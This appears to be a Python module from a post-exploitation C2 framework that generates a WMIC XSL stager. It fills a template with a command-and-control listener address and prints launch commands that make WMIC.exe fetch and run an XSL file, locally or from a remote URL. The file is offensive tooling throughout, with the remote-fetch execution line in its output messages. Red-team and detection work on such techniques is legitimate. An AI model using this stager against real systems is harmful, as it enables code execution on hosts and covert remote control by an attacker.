from core.utils import print_good, print_info


class STStager:
    def __init__(self):
        self.name = 'wmic'
        self.description = 'Stage via wmic XSL execution'
        self.author = '@byt3bl33d3r'
        self.options = {}

    def generate(self, listener, filename=None, as_string=False):
        stager_filename = filename if filename else 'wmic.xsl'

        with open('stagers/templates/wmic.xsl') as template:
            template = template.read()
            template = template.replace("C2_URL", f"{listener.name}://{listener['BindIP']}:{listener['Port']}")

            if not as_string:
                with open(stager_filename, 'w') as stager:
                    stager.write(template)
                    print_good(f"Generated stager to {stager.name}")
                    print_info("Launch with:")
                    print(f"\tC:\\Windows\\System32\\wbem\\WMIC.exe os get /format:\"https://myurl/{stager_filename}\"")
                    print(f"\tC:\\Windows\\System32\\wbem\\WMIC.exe os get /format:\"{stager_filename}\"")
            else:
                return template
